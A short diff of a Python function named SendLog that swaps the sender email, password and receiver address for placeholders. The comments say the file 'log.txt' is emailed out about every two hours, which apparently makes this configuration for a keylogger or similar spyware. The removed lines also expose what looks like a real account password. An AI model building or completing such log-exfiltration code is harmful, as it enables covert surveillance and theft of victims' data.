@@ -360,11 +360,11 @@ def SendLog():
         n = n+1
 
         # shipping mail [Principal]      <=> It will be sent
-        sender_email_P = "eneboltest@zohomail.com"   # <<== change this email
-        sender_password_P = "Y6dvxnd@"          # <<== email password
+        sender_email_P = "zoho@zohomail.com"   # <<== change this email
+        sender_password_P = "ThisIsPassword"          # <<== email password
 
         # Email or emails that will receive the data record `log.txt`
-        receiver_email = "eneboltest@zohomail.com"  # MultiEmail
+        receiver_email = "zoho@zohomail.com"  # MultiEmail
 
         # Send every 2 hours approx
         for x in range(180):  # 720
